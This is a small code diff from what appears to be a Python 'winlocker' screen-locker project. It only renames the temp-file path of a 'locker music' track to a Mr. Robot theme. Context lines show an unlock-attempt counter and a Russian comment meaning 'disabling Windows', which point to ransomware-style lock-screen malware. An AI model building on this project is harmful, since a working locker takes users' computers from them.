@@ -22,7 +22,7 @@ LOCKER_MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/m
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
-LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
+LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
 attempts_left = MAX_ATTEMPTS
 
 # ===== ОТКЛЮЧЕНИЕ WIN =====
